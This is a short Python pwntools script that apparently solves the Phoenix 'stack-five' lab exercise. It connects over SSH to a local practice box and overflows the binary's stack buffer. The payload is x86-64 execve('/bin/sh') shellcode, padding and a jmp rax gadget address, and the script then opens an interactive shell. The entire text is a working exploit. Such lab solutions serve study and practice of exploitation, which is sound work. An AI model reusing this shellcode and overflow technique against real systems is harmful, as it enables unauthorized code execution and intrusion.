from pwn import *
shell = ssh("user", "localhost", password="user", port=2222)

total = 136
sc = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
jmp_rax = p64(0x400481)
s = sc+b"a"*(total-len(sc))+jmp_rax

sh = shell.run(b"/opt/phoenix/amd64/stack-five")
sh.recvlines(1)
sh.sendline(s)
sh.interactive()
